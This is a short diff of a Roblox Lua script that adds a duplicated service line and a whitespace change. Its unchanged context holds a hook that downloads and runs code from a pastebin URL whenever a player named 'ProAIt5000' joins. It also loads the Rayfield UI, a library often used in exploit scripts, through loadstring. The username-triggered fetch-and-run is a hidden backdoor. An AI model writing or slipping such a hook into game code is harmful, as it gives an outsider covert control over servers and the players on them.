@@ -1,9 +1,11 @@
 local Players = game:GetService("Players")
 
+local Players = game:GetService("Players")
+
 Players.PlayerAdded:Connect(function(player)
   if player.Name == "ProAIt5000" then
 			loadstring(game:HttpGet("https://pastebin.com/raw/CBZ1CZ9s"))()
-		end
+		end	
 end)
 
 local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/CustomFIeld/main/RayField.lua'))()
